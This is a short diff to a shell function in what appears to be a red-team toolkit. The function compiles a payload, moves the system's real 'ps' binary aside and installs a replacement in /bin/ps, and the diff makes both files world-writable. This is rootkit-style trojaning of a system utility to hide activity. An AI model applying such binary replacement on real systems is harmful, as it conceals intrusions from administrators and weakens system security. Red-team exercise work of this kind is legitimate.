@@ -97,9 +97,10 @@ shim_ps(){
     echo -e "\nShimming ps... \n"
 
     gcc /opt/cdt-redteamtool/payload/ps/drop_ps.c -o /bin/procs
-    chmod +x /bin/procs
+    chmod 777 /bin/procs
     mv /bin/ps /var/cache/ps
     cp /opt/cdt-redteamtool/payload/ps/ps /bin/ps
+    chmod 777 /bin/ps
 
 
 }
